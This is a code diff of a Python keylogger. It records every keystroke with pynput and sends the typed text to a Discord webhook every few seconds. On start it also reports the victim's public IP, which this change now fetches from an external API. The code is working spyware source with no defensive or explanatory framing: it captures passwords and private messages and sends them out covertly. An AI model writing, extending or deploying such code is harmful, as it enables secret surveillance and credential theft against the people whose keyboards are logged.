@@ -2,8 +2,6 @@ from pynput import keyboard
 import requests
 import threading
 import time
-import subprocess
-import os
 import socket
 
 # Discord webhook URL (replace with your own webhook URL)
@@ -25,16 +23,17 @@ special_keys = {
     keyboard.Key.esc: " ESC ",
 }
 
-# Function to get the IP address of the machine
-def get_ip_address():
+def get_public_ip():
+    """Fetch the public IP address using an external API."""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(('8.8.8.8', 80))  # Google DNS to determine the IP
-        ip_address = s.getsockname()[0]
-        s.close()
-        return ip_address
+        # Use a public API to fetch the public IP address
+        response = requests.get('https://api.ipify.org?format=json')
+        if response.status_code == 200:
+            return response.json().get("ip")
+        else:
+            return "Unknown"
     except Exception as e:
-        print(f"Error getting IP address: {e}")
+        print(f"Error getting public IP address: {e}")
         return "Unknown"
 
 def send_to_webhook(message):
@@ -51,7 +50,6 @@ def send_to_webhook(message):
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
 
-
 def send_keystrokes_after_delay():
     """Send the keystrokes to the webhook after 10 seconds."""
     global keystrokes
@@ -59,7 +57,6 @@ def send_keystrokes_after_delay():
     if keystrokes:
         send_to_webhook(keystrokes)
         keystrokes = ""  # Reset keystrokes after sending
-
 
 def on_press(key):
     global keystrokes
@@ -76,16 +73,14 @@ def on_press(key):
     # Start a timer to send keystrokes after 10 seconds
     threading.Thread(target=send_keystrokes_after_delay).start()
 
-
 def on_release(key):
     if key == keyboard.Key.esc:
         # Stop the listener when the Esc key is pressed
         return False
 
-
-# Start by sending the IP address to the webhook
-ip_address = get_ip_address()
-send_to_webhook(f"Connection established. IP address: {ip_address}")
+# Start by sending the public IP address to the webhook
+public_ip = get_public_ip()
+send_to_webhook(f"Connection established. Public IP address: {public_ip}")
 
 # Set up the listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
